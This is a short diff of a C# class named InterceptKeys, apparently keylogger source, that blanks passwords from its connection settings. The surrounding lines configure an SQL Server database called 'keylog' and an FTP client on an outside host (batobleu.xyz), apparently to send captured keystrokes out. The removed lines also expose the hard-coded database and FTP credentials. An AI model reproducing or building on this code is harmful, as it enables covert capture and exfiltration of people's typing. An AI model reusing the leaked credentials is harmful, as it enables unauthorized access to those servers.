@@ -20,7 +20,7 @@ class InterceptKeys
     private static string texte = "";
     private static bool capital = false;
     private static IntPtr _hookID = IntPtr.Zero;
-    private static string log = @"Data Source=batobleu.xyz,3351; Initial Catalog=keylog;user id=root;Password=Patate360";
+    private static string log = @"Data Source=batobleu.xyz,3351; Initial Catalog=keylog;user id=root;Password=";
     private static SqlConnection cnxSQLServer = new SqlConnection(log);
     private static SqlCommand cmdSQLServer = cnxSQLServer.CreateCommand();
     private static string date;
@@ -40,7 +40,7 @@ class InterceptKeys
     };
     private static FtpClient client = new FtpClient("ftp.batobleu.xyz")
     {
-        Credentials = new NetworkCredential("11793_nexis", "patate360")
+        Credentials = new NetworkCredential("11793_nexis", "")
     };
     
     #endregion
